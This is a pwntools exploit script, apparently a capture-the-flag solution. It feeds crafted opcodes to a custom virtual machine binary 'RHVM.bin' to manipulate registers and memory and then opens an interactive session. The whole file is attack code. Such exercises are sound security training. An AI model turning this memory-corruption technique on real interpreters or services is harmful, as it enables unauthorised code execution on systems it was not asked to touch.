from pwn import *
context(arch='amd64',os='linux',log_level='debug')

sl = lambda x:io.sendline(x)
s = lambda x:io.send(x)
rn = lambda x:io.recv(x)
ru = lambda x:io.recvuntil(x, drop=True)
r = lambda :io.recv()
it = lambda: io.interactive()
success = lambda x, y:log.success(x + ' '+ hex(y))

binary = './RHVM.bin'
io = process(binary)
o = {"give":0x40, "print":0x60, "sub":208, 'memb':0x42}
ops = []
def add(a, b, c):
    ops.append((a << 16) + (b << 8) + c)

def moveBtoRA(a, b):
    add(0x40, a, b)

def printS():
    add(0x60, 0, 0)

def RAsubRB(a, b):
    add(208, a, b)

def RARdengyuRBM(a, b):
    add(0x42, a, b)

def RAMdengyuRBR(a, b):
    add(0x41, a, b)

def RAmulRB(a, b):
    add(0xc0, a, b)

def RAzuoyiRB(a, b):
    add(224, a, b)

def RAaddRB(a, b):
    add(160, a, b)

def pushRA(a):
    add(0x70, 0, a)


moveBtoRA(0, 6)
moveBtoRA(1, 4)
RAaddRB(0, 1)
RAsubRB(2, 0)
moveBtoRA(3, 5)
RAmulRB(3, 1)
RAsubRB(4, 3)
RARdengyuRBM(5, 4)
moveBtoRA(5, 6)
RAzuoyiRB(5, 1)
moveBtoRA(7, 8)
RAaddRB(0, 5)
RAaddRB(0, 7)
RAaddRB(0, 1)
RAMdengyuRBR(2, 0)
moveBtoRA(3, 1)
RAaddRB(2, 3)
RAaddRB(4, 3)
RARdengyuRBM(6, 4)
RAMdengyuRBR(2, 0)
moveBtoRA(0, 2)
moveBtoRA(2, 3)
RAzuoyiRB(0, 1)
RAaddRB(0, 2)
RAzuoyiRB(0, 1)
RAaddRB(0, 2)
pushRA(0)
printS()





io = process(binary)

ru('EIP: ')
sl('0')
ru('ESP: ')
sl('0')
ru('Give me code length: ')
sl(str(len(ops)))
ru('Give me code: ')
for i in ops:
    sl(str(i))
it()